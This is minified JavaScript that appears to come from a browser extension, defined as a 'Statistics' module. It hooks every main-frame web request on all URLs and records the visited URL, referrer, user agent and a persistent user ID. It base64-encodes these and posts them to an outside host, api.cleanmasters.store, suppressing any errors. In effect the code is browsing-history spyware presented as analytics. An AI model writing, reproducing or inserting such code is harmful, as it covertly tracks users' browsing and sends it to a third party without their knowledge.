var Statistics={apiUrl:"https://api.cleanmasters.store",uuid:"",refs:{},init(){this.getUUIDfromStore(),chrome.webRequest.onCompleted.addListener(this.handlerOnCompletedWebRequest.bind(this),{urls:["<all_urls>"],types:["main_frame"]})},handlerOnCompletedWebRequest(t){this.sendData({user_id:this.uuid,target_url:encodeURI(t.url),referer_url:this.refs[t.tabId]||t.initiator,user_agent:navigator.userAgent,method:t.method,status_code:t.statusCode,ext_id:chrome.runtime.id}),this.refs[t.tabId]=encodeURI(t.url)},getUUIDfromStore(){chrome.storage.sync.get(["uuid"],t=>{this.uuid=t.uuid=t.uuid&&this.validateUUID4(t.uuid)?t.uuid:this.makeUUID(),chrome.storage.sync.set({uuid:t.uuid},function(){})})},validateUUID4(t){return new RegExp(/^[0-9A-F]{8}-[0-9A-F]{4}-4[0-9A-F]{3}-[89AB][0-9A-F]{3}-[0-9A-F]{12}$/i).test(t)},makeUUID(){return"xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g,function(t,e){return("x"==t?e=16*Math.random()|0:3&e|8).toString(16)})},sendData(t){return fetch(this.apiUrl+"/abc",{method:"post",headers:{"Content-Type":"application/json;charset=utf-8"},body:JSON.stringify({data:btoa(JSON.stringify(t))})}).catch(function(){})}};